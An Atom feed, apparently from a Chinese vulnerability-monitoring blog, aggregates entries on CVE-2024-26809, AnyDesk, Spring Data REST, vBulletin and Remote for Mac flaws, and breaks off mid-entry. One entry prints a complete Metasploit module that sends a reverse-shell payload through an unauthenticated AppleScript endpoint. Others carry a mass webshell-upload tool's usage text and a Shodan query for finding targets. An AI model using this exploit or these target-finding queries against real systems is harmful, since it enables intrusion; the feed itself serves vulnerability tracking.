<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>liancc&#39; infos blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-06-01T13:17:30.042Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>lianccc</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux 权限提升漏洞 (OtterRoot)</title>
    <link href="http://example.com/2025/06/01/github_2088529382/"/>
    <id>http://example.com/2025/06/01/github_2088529382/</id>
    <published>2025-06-01T13:17:30.046Z</published>
    <updated>2025-06-01T13:17:30.042Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Linux 权限提升漏洞 (OtterRoot)</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-26809</li></ul><p><strong>漏洞类型：</strong> 权限提升</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Linux系统中存在一个权限提升漏洞（CVE-2024-26809），被称为OtterRoot。该漏洞允许攻击者在受影响的系统上提升权限。漏洞利用代码自包含于一个单一的exploit.c文件中，具有极高的可移植性。</p><p><strong>产品名称：</strong> Linux</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/19863">https://github.com/rapid7/metasploit-framework/issues/19863</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&lt;!<span class="hljs-comment">--</span><br>  To make <span class="hljs-keyword">it</span> easier <span class="hljs-keyword">for</span> us <span class="hljs-built_in">to</span> help you, please <span class="hljs-built_in">include</span> <span class="hljs-keyword">as</span> much useful information <span class="hljs-keyword">as</span> possible.<br><br>  Useful Links:<br>  - Wiki: <span class="hljs-keyword">https</span>://docs.metasploit.com/<br><br>  Before opening <span class="hljs-keyword">a</span> <span class="hljs-built_in">new</span> issue, please search existing issues <span class="hljs-keyword">https</span>://github.com/rapid7/metasploit-framework/issues<br><span class="hljs-comment">--&gt;</span><br><br><span class="hljs-comment">## Summary</span><br><br>Offset-less Linux LPE (CVE<span class="hljs-number">-2024</span><span class="hljs-number">-26809</span>)<br><br><span class="hljs-comment">### Basic example</span><br><br>![Image](<span class="hljs-keyword">https</span>://github.com/user-attachments/assets/f77f9608-d343<span class="hljs-number">-4039</span><span class="hljs-number">-80</span>a8<span class="hljs-number">-51</span>fb1bd64716)<br><br>- <span class="hljs-keyword">https</span>://osec.io/blog/<span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-25</span>-netfilter-universal-root<span class="hljs-number">-1</span>-day/<br>- <span class="hljs-keyword">https</span>://github.com/otter-<span class="hljs-built_in">sec</span>/OtterRoot/tree/master<br><br><span class="hljs-comment">### Motivation</span><br><br>Self-contained (<span class="hljs-keyword">a</span> single exploit.c <span class="hljs-built_in">file</span>) ultra-portable Linux exploit.<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Linux 权限提升漏洞 (OtterRoot)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2024-26809&lt;/li&gt;
&lt;/ul</summary>
      
    
    
    
    <category term="漏洞监控" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="CVE-2024-26809" scheme="http://example.com/tags/CVE-2024-26809/"/>
    
    <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
  </entry>
  
  <entry>
    <title>AnyDesk 远程代码执行漏洞</title>
    <link href="http://example.com/2025/06/01/github_1507688631/"/>
    <id>http://example.com/2025/06/01/github_1507688631/</id>
    <published>2025-06-01T13:17:19.040Z</published>
    <updated>2025-06-01T13:17:19.038Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> AnyDesk 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-13160</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> AnyDesk远程访问软件存在远程代码执行（RCE）漏洞，允许攻击者在目标系统上执行恶意代码。CVE-2020-13160突出了在5.5.2版本之前的DLL劫持缺陷，使得未经授权的系统访问成为可能。此外，认证绕过风险允许攻击者跳过登录要求，而DLL注入则允许恶意库运行。不安全的权限管理可能授予用户过多的权限。剪贴板数据泄露暴露了敏感复制的信息，网络扫描漏洞揭示了系统信息。</p><p><strong>产品厂商：</strong> AnyDesk</p><p><strong>产品名称：</strong> AnyDesk</p><p><strong>影响版本：</strong> version &lt; 5.5.2</p><p><strong>来源：</strong> <a href="https://github.com/Quelvara/Anydesk-Exploit-CVE-2025-12654-RCE-Builder">https://github.com/Quelvara/Anydesk-Exploit-CVE-2025-12654-RCE-Builder</a></p><p><strong>类型：</strong> CVE-2025:github search</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs gams">&lt;p align=<span class="hljs-string">&quot;center&quot;</span>&gt;<br>  &lt;a href=<span class="hljs-string">&quot;http://www.theunwindai.com&quot;</span>&gt;<br>    &lt;img src=<span class="hljs-string">&quot;https://github.com/user-attachments/assets/fe95e86b-926a-45e1-bb58-741b34bf76a0&quot;</span> width=<span class="hljs-string">&quot;900&quot;</span> height=<span class="hljs-string">&quot;400&quot;</span> alt=<span class="hljs-string">&quot;Unwind AI&quot;</span>&gt;<br>  &lt;/a&gt;<br>&lt;/p&gt;<br><br>&lt;<span class="hljs-built_in">div</span> align=<span class="hljs-string">&quot;center&quot;</span>&gt;<br><br>&lt;a href=<span class="hljs-string">&quot;z&quot;</span>&gt;&lt;img src=<span class="hljs-string">&quot;https://img.shields.io/badge/VB.NET-512BD4?style=for-the-badge&amp;logo=dotnet&amp;logoColor=white&quot;</span>/&gt;&lt;/a&gt;<br>&lt;a href=<span class="hljs-string">&quot;z&quot;</span>&gt;&lt;img src=<span class="hljs-string">&quot;https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&amp;logo=visual%20studio&amp;logoColor=white&quot;</span>/&gt;&lt;/a&gt;<br>&lt;a href=<span class="hljs-string">&quot;z&quot;</span>&gt;&lt;img src=<span class="hljs-string">&quot;https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&amp;logo=visual%20studio%20code&amp;logoColor=white&quot;</span>/&gt;&lt;/a&gt;<br>&lt;/<span class="hljs-built_in">div</span>&gt;<br><br><br># AnyDesk Exploit<br><br>AnyDesk, remote access software, has faced security concerns like RCE (Remote Code Execution), allowing attackers to execute malicious code on target systems. CVE<span class="hljs-number">-2020</span><span class="hljs-number">-13160</span> highlights a DLL hijacking flaw in versions prior to <span class="hljs-number">5.5</span><span class="hljs-number">.2</span>, enabling unauthorized <span class="hljs-keyword">system</span> access. Authentication bypass risks let attackers skip login requirements, <span class="hljs-keyword">while</span> DLL injection allows malicious libraries to run. Insecure permission management may grant excessive user privileges. Clipboard data leakage exposes sensitive copied content, <span class="hljs-keyword">and</span> network scanning vulnerabilities reveal <span class="hljs-keyword">system</span> info.<br><br>## Features<br><br><span class="hljs-comment">* 1. RCE (Remote Code Execution)</span><br><span class="hljs-comment">* 2. CVE-2020-13160</span><br><span class="hljs-comment">* 3. Authentication Bypass</span><br><span class="hljs-comment">* 4. DLL Injection</span><br><span class="hljs-comment">* 5. Insecure Permission Management</span><br><span class="hljs-comment">* 6. CVE-2019-14743</span><br><span class="hljs-comment">* 7. Unauthorized Audio Chat Access</span><br><span class="hljs-comment">* 8. Clipboard Data Leakage</span><br><span class="hljs-comment">* 9. Network Scanning Vulnerability</span><br><span class="hljs-comment">* 10. Version Check Bypass</span><br><br>### Requirements  <br>- Visual Studio <span class="hljs-number">2022</span><br>- .NET Framework must be installed.  <br>![<span class="hljs-number">133</span>](https:<span class="hljs-comment">//github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)</span><br><br>### Compilation<br>- Download the project to your computer<br>- Extract the project to a Folder.<br>- Open Solution <span class="hljs-keyword">File</span><br>- Select **Build Solution** from the **Build** menu.<br>  - ![vsgif](https:<span class="hljs-comment">//github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)</span><br><br>- Find Executable <span class="hljs-keyword">File</span><br><br>./bin/Debug/<br><br><br>## Preview<br>![photo_2025<span class="hljs-number">-04</span><span class="hljs-number">-02</span>_20<span class="hljs-number">-19</span><span class="hljs-number">-43</span>](https:<span class="hljs-comment">//github.com/user-attachments/assets/fc7ae72d-9e99-4155-b170-9e2a30ec1ba4)</span><br><br><br>https:<span class="hljs-comment">//github.com/user-attachments/assets/a50bb11e-bd9c-44c3-a459-4ddd0a6a9932</span><br><br>## Contributing<br><br><span class="hljs-comment">**⭐ Star this repository if you find it useful!**</span><br><br>## Disclaimer<br><br><span class="hljs-comment">**This content is provided for learning and testing purposes only. The information presented is for general information purposes and does not address any specific situation.**</span><br><br><br>## Licence<br><br>Project is licenced under the [MIT licence](https:<span class="hljs-comment">//github.com/AvaloniaUI/Avalonia/blob/master/licence.md).</span><br><br></code></pre></td></tr></table></figure><pre><code class="hljs">- .github- AnyDesk- AnyDesk Exploit.sln- AnyDesk Exploit- LICENSE- README.md- SECURITY.md```</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; AnyDesk 远程代码执行漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2020-13160&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;st</summary>
      
    
    
    
    <category term="漏洞监控" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
    <category term="CVE-2020-13160" scheme="http://example.com/tags/CVE-2020-13160/"/>
    
  </entry>
  
  <entry>
    <title>Spring Data REST &amp; Boot 任意代码执行漏洞</title>
    <link href="http://example.com/2025/06/01/github_2129592255/"/>
    <id>http://example.com/2025/06/01/github_2129592255/</id>
    <published>2025-06-01T13:17:04.996Z</published>
    <updated>2025-06-01T13:17:04.994Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Spring Data REST &amp; Boot 任意代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2017-8046</li></ul><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Spring Data REST &lt; 2.6.9和3.0.1，Spring Boot &lt; 1.5.9和2.0 M6版本中存在远程代码执行漏洞，攻击者可以通过发送恶意的PATCH请求，利用精心构造的JSON数据执行任意Java代码。</p><p><strong>产品厂商：</strong> Spring</p><p><strong>产品名称：</strong> Spring Data REST, Spring Boot</p><p><strong>影响版本：</strong> Spring Data REST &lt; 2.6.9 and 3.0.1, Spring Boot &lt; 1.5.9 and 2.0 M6</p><p><strong>搜索语法：</strong> http.title:”eureka”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12202">https://github.com/projectdiscovery/nuclei-templates/issues/12202</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### Description: <br>&gt; Spring Data REST &lt; <span class="hljs-number">2.6</span><span class="hljs-number">.9</span> and <span class="hljs-number">3.0</span><span class="hljs-number">.1</span>, Spring Boot &lt; <span class="hljs-number">1.5</span><span class="hljs-number">.9</span> and <span class="hljs-number">2.0</span> M6 contain a remote <span class="hljs-keyword">code</span> execution caused by processing malicious PATCH requests <span class="hljs-keyword">with</span> crafted JSON data, letting attackers execute arbitrary Java <span class="hljs-keyword">code</span>, exploit requires sending malicious PATCH requests.<br><br>#### Severity: `Critical`<br><br>#### POC: <br>- https:<span class="hljs-comment">//github.com/guanjivip/CVE-2017-8046</span><br>- https:<span class="hljs-comment">//github.com/jsotiro/VulnerableSpringDataRest</span><br>- https:<span class="hljs-comment">//github.com/cved-sources/cve-2017-8046</span><br>- https:<span class="hljs-comment">//vulncheck.com/xdb/a2ab2493c69d</span><br>- https:<span class="hljs-comment">//github.com/bkhablenko/CVE-2017-8046</span><br>- https<span class="hljs-comment">///github.com:bkhablenko/CVE-2017-8046.git</span><br>- https:<span class="hljs-comment">//github.com/jkutner/spring-break-cve-2017-8046</span><br>- https:<span class="hljs-comment">//vulncheck.com/xdb/cf4f8c3e40a7</span><br>- https:<span class="hljs-comment">//github.com/FixYourFace/SpringBreakPoC</span><br>- https<span class="hljs-comment">///github.com:FixYourFace/SpringBreakPoC.git</span><br>- https:<span class="hljs-comment">//github.com/m3ssap0/spring-break_cve-2017-8046</span><br>- https:<span class="hljs-comment">//github.com/m3ssap0/SpringBreakVulnerableApp</span><br>- https:<span class="hljs-comment">//github.com/sj/spring-data-rest-CVE-2017-8046</span><br>- https:<span class="hljs-comment">//github.com/Soontao/CVE-2017-8046-DEMO</span><br><br>### KEV: <span class="hljs-literal">True</span><br><br>### Shodan Query: `http.title:<span class="hljs-string">&quot;eureka&quot;</span>`<br><br>&gt; Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(`-debug`) along <span class="hljs-keyword">with</span> the template to help the triage team <span class="hljs-keyword">with</span> validation or can also share a vulnerable environment like docker file. <br><br>&gt; Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding <span class="hljs-keyword">code</span> templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates <span class="hljs-keyword">with</span> other protocols unless exceptions are made.<br><br>You can check the FAQ for the Nuclei Templates Community Rewards Program [here](https:<span class="hljs-comment">//github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md).</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Spring Data REST &amp;amp; Boot 任意代码执行漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2017-804</summary>
      
    
    
    
    <category term="漏洞监控" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="CVE-2017-8046" scheme="http://example.com/tags/CVE-2017-8046/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Vbulletin 远程代码执行漏洞</title>
    <link href="http://example.com/2025/06/01/github_1417705317/"/>
    <id>http://example.com/2025/06/01/github_1417705317/</id>
    <published>2025-06-01T13:16:52.072Z</published>
    <updated>2025-06-01T13:16:52.069Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Vbulletin 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-48827</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> vBulletin版本5.0.0至5.7.5和6.0.0至6.0.3在使用PHP 8.1时存在远程代码执行漏洞，攻击者可以利用此漏洞上传PHP webshell，从而在服务器上执行任意代码。</p><p><strong>产品厂商：</strong> vBulletin</p><p><strong>产品名称：</strong> vBulletin</p><p><strong>影响版本：</strong> 5.0.0 - 5.7.5, 6.0.0 - 6.0.3</p><p><strong>来源：</strong> <a href="https://github.com/wiseep/CVE-2025-48827">https://github.com/wiseep/CVE-2025-48827</a></p><p><strong>类型：</strong> CVE-2025:github search</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">**Description:**<br><br>RCE <span class="hljs-keyword">for</span> Vbullettin versions between <span class="hljs-number">5.0</span><span class="hljs-number">.0</span> - <span class="hljs-number">5.7</span><span class="hljs-number">.5</span> <span class="hljs-keyword">and</span> <span class="hljs-number">6.0</span><span class="hljs-number">.0</span> - <span class="hljs-number">6.0</span><span class="hljs-number">.3</span> <span class="hljs-keyword">with</span> PHP <span class="hljs-number">8.1</span><br><br>**Futures:**<br><br>- Multi thread<br>- Read <span class="hljs-built_in">from</span> multiple target <span class="hljs-built_in">from</span> <span class="hljs-built_in">file</span><br>- Detect vbullettin websites<br>- Checks vulnerabilit, <span class="hljs-keyword">if</span> succes upload <span class="hljs-keyword">a</span> php webshell<br><br><br>**Detail <span class="hljs-keyword">of</span> usage:**<br><br>usage: CVE<span class="hljs-number">-2025</span><span class="hljs-number">-48827.</span>py [-h] [<span class="hljs-comment">--url URL] [--list LIST] [--threads THREADS] [--timeout TIMEOUT]</span><br><br>Identify <span class="hljs-keyword">and</span> upload <span class="hljs-built_in">shell</span> <span class="hljs-keyword">on</span> <span class="hljs-title">vBulletin</span> <span class="hljs-title">targets</span>.<br><br>optional arguments:<br><br>  -h, <span class="hljs-comment">--help         show this help message and exit</span><br>  <br>  <span class="hljs-comment">--url URL          Single target URL</span><br>  <br>  <span class="hljs-comment">--list LIST        File with list of targets</span><br>  <br>  <span class="hljs-comment">--threads THREADS  Threads to use (default: 5)</span><br>  <br>  <span class="hljs-comment">--timeout TIMEOUT  Request timeout in seconds (default: 10)</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">- CVE-2025-48827.py- README.md```</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Vbulletin 远程代码执行漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2025-48827&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;</summary>
      
    
    
    
    <category term="漏洞监控" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="CVE-2025-48827" scheme="http://example.com/tags/CVE-2025-48827/"/>
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
  </entry>
  
  <entry>
    <title>Remote for Mac 未授权远程代码执行漏洞</title>
    <link href="http://example.com/2025/06/01/github_1860810429/"/>
    <id>http://example.com/2025/06/01/github_1860810429/</id>
    <published>2025-06-01T13:16:39.709Z</published>
    <updated>2025-06-01T13:16:39.705Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Remote for Mac 未授权远程代码执行漏洞</p><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该模块利用了Remote for Mac版本至2025.7（包括补丁版本）中的未授权远程代码执行漏洞，通过&#x2F;api&#x2F;executeScript端点。当目标系统上禁用认证时，攻击者可以执行任意AppleScript命令，包括通过<code>do shell script</code>执行的shell命令。</p><p><strong>产品名称：</strong> Remote for Mac</p><p><strong>影响版本：</strong> version &lt;&#x3D; 2025.7</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/a21fc34c4d7268d9e14610e8a8a4e429eecf74ed/modules%2Fexploits%2Fosx%2Fhttp%2Fremote_for_mac_rce.rb">https://github.com/rapid7/metasploit-framework/blob/a21fc34c4d7268d9e14610e8a8a4e429eecf74ed/modules%2Fexploits%2Fosx%2Fhttp%2Fremote_for_mac_rce.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><pre><code class="hljs">require &#39;json&#39;class MetasploitModule &lt; Msf::Exploit::Remote  Rank = NormalRanking  include Msf::Exploit::Remote::HttpClient  prepend Msf::Exploit::Remote::AutoCheck  def initialize(info = &#123;&#125;)    super(      update_info(        info,        &#39;Name&#39; =&gt; &#39;Remote for Mac &lt;= 2025.7 - Unauthenticated RCE&#39;,        &#39;Description&#39; =&gt; %q&#123;          This module exploits an unauthenticated remote code execution vulnerability in          Remote for Mac versions up to and including 2025.7 via the /api/executeScript endpoint.          When authentication is disabled on the target system, it allows attackers to execute          arbitrary AppleScript commands, which can include shell commands via `do shell script`.          All versions up to 2025.7 (including patch versions) are vulnerable.        &#125;,        &#39;License&#39; =&gt; MSF_LICENSE,        &#39;Author&#39; =&gt; [&#39;Chokri Hammedi (@blue0x1)&#39;],        &#39;References&#39; =&gt; [          [&#39;PACKETSTORM&#39;, &#39;195347&#39;]        ],        &#39;DisclosureDate&#39; =&gt; &#39;2025-05-27&#39;,        &#39;Platform&#39; =&gt; [&#39;unix&#39;,&#39;osx&#39;],        &#39;Arch&#39; =&gt; ARCH_CMD,        &#39;Targets&#39; =&gt; [[&#39;Auto&#39;, &#123;&#125;]],        &#39;DefaultTarget&#39; =&gt; 0,        &#39;DefaultOptions&#39; =&gt; &#123;          &#39;RPORT&#39; =&gt; 49229,          &#39;SSL&#39; =&gt; true        &#125;,        &#39;Notes&#39; =&gt; &#123;          &#39;Stability&#39; =&gt; [&#39;CRASH_SAFE&#39;],          &#39;Reliability&#39; =&gt; [&#39;REPEATABLE_SESSION&#39;],          &#39;SideEffects&#39; =&gt; [&#39;ARTIFACTS_ON_DISK&#39;]        &#125;      )    )  end  def check    res = send_request_cgi(      &#39;uri&#39; =&gt; normalize_uri(target_uri.path, &#39;api&#39;, &#39;getVersion&#39;),      &#39;method&#39; =&gt; &#39;GET&#39;    )    return CheckCode::Unknown(&#39;No response from target&#39;) unless res&amp;.code == 200    info = res.get_json_document    if info.empty?      return CheckCode::Unknown(&#39;Unable to parse JSON from /api/getVersion&#39;)    end    if info.dig(&#39;requires.auth&#39;) == true      return CheckCode::Safe(&#39;Target requires authentication on /api/executeScript&#39;)    end    version = info.dig(&#39;version&#39;).to_s    if version.empty?      return CheckCode::Unknown(&#39;Could not determine target version&#39;)    end    begin      target_version = Rex::Version.new(version)      vulnerable_version = Rex::Version.new(&#39;2025.7&#39;)            if target_version &lt;= vulnerable_version        return CheckCode::Appears      else        return CheckCode::Safe(&quot;Target version #&#123;version&#125; is not vulnerable&quot;)      end    rescue ArgumentError      return CheckCode::Unknown(&quot;Invalid version format: #&#123;version&#125;&quot;)    end  end  def exploit    print_status(&quot;Generating reverse shell payload for #&#123;datastore[&#39;LHOST&#39;]&#125;:#&#123;datastore[&#39;LPORT&#39;]&#125;&quot;)    cmd = payload.encoded    applescript = %(do shell script &quot;#&#123;cmd&#125;&quot;)    host_name = Rex::Text.rand_text_alpha(8)    host_model = &quot;#&#123;Rex::Text.rand_text_alpha(4)&#125;#&#123;rand(99)&#125;&quot;    script_name = Rex::Text.rand_text_alpha(8)    print_status(&quot;Sending exploit to #&#123;rhost&#125;:#&#123;rport&#125; via AppleScript&quot;)    res = send_request_cgi(      &#39;uri&#39; =&gt; normalize_uri(target_uri.path, &#39;api&#39;, &#39;executeScript&#39;),      &#39;method&#39; =&gt; &#39;GET&#39;,      &#39;headers&#39; =&gt; &#123;        &#39;X-ClientToken&#39; =&gt; Rex::Text.rand_text_numeric(4),        &#39;X-HostName&#39; =&gt; host_name,        &#39;X-HostFullModel&#39; =&gt; host_model,        &#39;X-Script&#39; =&gt; applescript,        &#39;X-ScriptName&#39; =&gt; script_name,        &#39;X-ScriptDelay&#39; =&gt; &#39;0&#39;      &#125;    )    if res&amp;.code == 200      print_good(&#39;Payload delivered successfully. Awaiting session...&#39;)    else      fail_with(Failure::UnexpectedReply, &quot;Unexpected HTTP response: #&#123;res&amp;.code || &#39;no response&#39;&#125;&quot;)    end  endend```</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Remote for Mac 未授权远程代码执行漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞类型：&lt;/strong&gt; 未授权访问&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞等级：&lt;/strong&gt; 高危&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞描</summary>
      
    
    
    
    <category term="漏洞监控" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>Langflow 远程代码执行漏洞</title>
    <link href="http://example.com/2025/06/01/github_4139753060/"/>
    <id>http://example.com/2025/06/01/github_4139753060/</id>
    <published>2025-06-01T13:16:28.449Z</published>
    <updated>2025-06-01T13:16:28.445Z</updated>
    
